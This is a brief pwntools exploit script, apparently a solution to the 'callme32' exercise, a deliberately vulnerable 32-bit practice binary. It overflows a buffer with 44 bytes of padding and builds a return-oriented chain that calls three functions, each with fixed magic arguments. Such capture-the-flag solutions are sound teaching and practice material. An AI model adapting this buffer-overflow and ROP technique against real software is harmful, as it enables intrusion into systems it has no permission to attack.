# coding: utf-8
from pwn import *
pr = process("./callme32")
one, two, three = (0x080484f0, 0x8048550, 0x080484e0)
arg_1, arg_2, arg_3 = (0xdeadbeef, 0xcafebabe, 0xd00df00d)
pop_addr = (0x080487f9)
payload = b"A" * 44 + p32(one) + p32(pop_addr) + p32(arg_1) + p32(arg_2) + p32(arg_3) + p32(two) + p32(pop_addr) + p32(arg_1) + p32(arg_2) + p32(arg_3) + p32(three) + p32(pop_addr) + p32(arg_1) + p32(arg_2) + p32(arg_3)
pr.sendline(payload)
pr.recvall()
